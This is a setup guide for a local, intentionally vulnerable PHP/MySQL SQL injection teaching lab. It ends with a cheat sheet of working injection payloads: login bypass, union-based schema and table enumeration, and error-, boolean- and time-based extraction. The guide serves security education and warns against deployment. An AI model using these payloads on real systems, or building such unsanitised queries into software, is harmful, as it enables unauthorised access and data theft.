# SQL Injection Lab Setup Guide

This project is designed as an educational demonstration of SQL injection vulnerabilities. The lab includes user authentication and a searchable database that are intentionally vulnerable to various SQL injection techniques.

> [!CAUTION]
> **WARNING:** This application is intentionally vulnerable to SQL injection. **DO NOT** deploy this application to a production server or any environment accessible from the internet. Run it only in an isolated, local development environment for educational purposes.

## Prerequisites

To run this lab, you need to have a web server with PHP and MySQL. We recommend using **XAMPP**.

### 1. XAMPP Installation

1. Download XAMPP for your operating system from the [official website](https://www.apachefriends.org/index.html).
2. Run the installer and follow the on-screen instructions. Make sure to install at least the **Apache** and **MySQL** components.

## Deployment Steps

### 2. File Location

For the web application to run correctly, you must place the project files in the appropriate directory served by your web server.

1. Locate your XAMPP installation directory (e.g., `C:\xampp` on Windows or `/opt/lampp` on Linux/macOS).
2. Inside the XAMPP directory, find the `htdocs` folder. This is the default document root for Apache.
3. Create a new folder inside `htdocs` for this project, for example, `demoLogIn`.
   - The path should look like: `C:\xampp\htdocs\demoLogIn`
4. Copy all the PHP, CSS, and SQL files (like `index.php`, `login.php`, `db.php`, `setup.sql`, etc.) into this new `demoLogIn` folder.

### 3. Database Setup

The application requires a MySQL database to function. You will use the provided `setup.sql` file or run the commands manually.

**Using phpMyAdmin (Recommended):**

1. Start the **Apache** and **MySQL** services from the XAMPP Control Panel.
2. Open your web browser and navigate to `http://localhost/phpmyadmin/`.
3. Click on the **SQL** tab at the top.
4. Copy the following SQL commands (from `setup.sql`) and paste them into the query box:

```sql
CREATE DATABASE IF NOT EXISTS weblogin;
USE weblogin;

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(255),
    age INT,
    city VARCHAR(255)
);
```
5. Click the **Go** button at the bottom right to execute the query. This will create the `weblogin` database and the `users` table.

**Using MySQL Command Line:**

Alternatively, you can run the commands using the MySQL command line tool:

1. Open your terminal or command prompt.
2. Navigate to the XAMPP MySQL bin directory: `cd C:\xampp\mysql\bin`
3. Connect to MySQL as the root user: `mysql -u root`
4. Once logged in, run the SQL commands:
   ```sql
   CREATE DATABASE IF NOT EXISTS weblogin;
   USE weblogin;
   CREATE TABLE IF NOT EXISTS users (
       id INT AUTO_INCREMENT PRIMARY KEY,
       name VARCHAR(255) NOT NULL,
       password VARCHAR(255) NOT NULL,
       email VARCHAR(255),
       age INT,
       city VARCHAR(255)
   );
   ```

### 4. Running the Application

1. Ensure both **Apache** and **MySQL** services are running in your XAMPP Control Panel.
2. Open your web browser and navigate to:
   `http://localhost/demoLogIn/`
   *(Replace `demoLogIn` with the name of the folder you created in `htdocs` if you chose a different name).*

You should now see the login or index page of the SQL Injection Lab.

## Database Configuration Details

By default, XAMPP sets up MySQL with a `root` user and no password. The application (`db.php`) is pre-configured to use these default credentials:

- **Host:** localhost
- **Database:** weblogin
- **Username:** root
- **Password:** *(empty)*

If you have changed your MySQL root password or wish to use a different database user, you must update the connection details in the `db.php` file.



### 5. SQL codes and Malicious SQL Code

' or 1=1;#
//Login Backend Query
select * from users where username = 'INPUT_1' and password = 'INPUT_2';

//Search Backend Query
select * from users where name = 'INPUT';

================ Union based ==================

' order by 20;#

' UNION SELECT 1,2,3,4,5,6;#

' UNION SELECT 1,2,3,database(),user(),version();#

select schema_name from information_schema.schemata;

' UNION SELECT 1,schema_name,3,database(),user(),version() from information_schema.schemata;#

select table_name from information_schema.tables where table_schema = "dvwa";#weblogin

' UNION SELECT 1,table_name,3,database(),user(),version() from information_schema.tables where table_schema ="dvwa";#

' UNION SELECT 1,group_concat(table_name),3,database(),user(),version() from information_schema.tables where table_schema ="dvwa";#

================ Error based ==================

select * from users group by round(rand(0)) having min(0);#

select name, concat(version()," ",database()," ",user()," ", round(rand(0))) from users group by round(rand(0)) having min(0);#

' or 1=1 group by concat(version()," ",database()," ",user()," ", round(rand(0))) having min(0);#

================ Boolean based ==================

select * from users where name = 'Govind' or length(database()) = "8";#

select * from users where name = 'Govind' or substring(database(),1,1) = "w";#

select * from users where name = 'Govind' or database() like "%logs%";#

' or length(database()) = "1";#

================ Time based ==================

select * from users where name = 'Govind' and if(database()="weblogin", sleep(5), sleep(10));#

Govind' and if(database()="data", sleep(5), sleep(10));#